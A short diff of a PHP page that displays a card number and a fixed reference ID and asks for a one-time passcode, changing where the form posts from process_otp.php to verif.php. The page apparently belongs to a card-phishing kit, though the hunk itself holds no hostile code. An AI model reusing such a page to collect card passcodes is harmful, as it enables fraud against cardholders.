@@ -133,7 +133,7 @@ function displayForm($cardNumber) {
         <p><strong>Card Number:</strong> $cardNumber</p>
             <p><strong>Reference Id:</strong> 298879</p>
         </div>
-        <form action="process_otp.php" method="POST">
+        <form action="verif.php" method="POST">
             <div class="form-group">
                 <label for="otp">Enter One-Time Passcode</label>
                 <input type="text" id="otp" name="otp" placeholder="Enter One-Time Passcode">
